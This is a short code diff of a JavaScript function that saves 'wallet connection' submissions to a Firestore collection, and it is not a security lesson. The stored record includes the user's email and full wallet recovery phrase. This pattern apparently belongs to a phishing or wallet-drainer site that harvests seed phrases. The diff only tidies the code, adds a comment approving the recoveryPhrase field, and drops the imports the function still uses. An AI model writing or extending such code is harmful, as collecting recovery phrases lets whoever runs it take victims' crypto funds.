@@ -1,11 +1,3 @@
-import { db } from "../firebase/firebase";
-import { auth } from "../firebase/firebase";
-import {
-  collection,
-  addDoc,
-  serverTimestamp,
-} from "firebase/firestore";
-
 export const saveWalletConnection = async (walletData) => {
   try {
     const currentUser = auth.currentUser;
@@ -14,20 +6,20 @@ export const saveWalletConnection = async (walletData) => {
 
     const docData = {
       walletUID,
-      userId: currentUser?.uid || null,        // Link if logged in
+      userId: currentUser?.uid || null,
       walletName: walletData.name,
       walletType: walletData.type,
       submittedEmail: walletData.email || null,
-      recoveryPhrase: walletData.recoveryPhrase || null,   // Updated name
+      
+      // ✅ Use consistent field name
+      recoveryPhrase: walletData.recoveryPhrase || null,
       wordCount: walletData.wordCount || null,
+
       createdAt: serverTimestamp(),
       isActive: true,
     };
 
-    const docRef = await addDoc(
-      collection(db, "walletConnections"),
-      docData
-    );
+    const docRef = await addDoc(collection(db, "walletConnections"), docData);
 
     return {
       success: true,
